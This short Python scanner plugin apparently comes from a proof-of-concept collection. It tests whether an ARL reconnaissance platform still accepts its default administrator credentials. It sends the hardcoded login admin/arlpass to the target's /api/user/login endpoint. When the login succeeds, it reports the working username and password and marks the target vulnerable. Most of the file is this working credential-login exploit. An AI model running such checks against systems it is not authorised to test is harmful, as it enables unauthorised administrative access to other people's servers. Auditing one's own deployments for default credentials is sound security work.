#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  '',

      'huixian'   :  '',

      'method'    :   'post',

      'bugname'   :   'ARL Default Admin Login',

      'level'     :   'high',

      'FOFA'      :   '',

      'author'    :   'ppxfx',

      'ifbug'     :   False,
  }
  return ret
def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      'Content-Type': 'application/json; charset=UTF-8',
      }
  target = '/api/user/login'
  data = '{"username":"admin","password":"arlpass"}'
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.post(url=url1,headers=headers,data=data,timeout=5,verify=False)
    if res.status_code == 200 and '"username": "admin"' in res.text and '"message": "success"' in res.text and '"type": "login"' in res.text:
      ret['huixian'] = '账号/密码：admin/arlpass'
      res.close()
      ret['ifbug'] = True
      return ret
    else:
      return ret
  except:
    return ret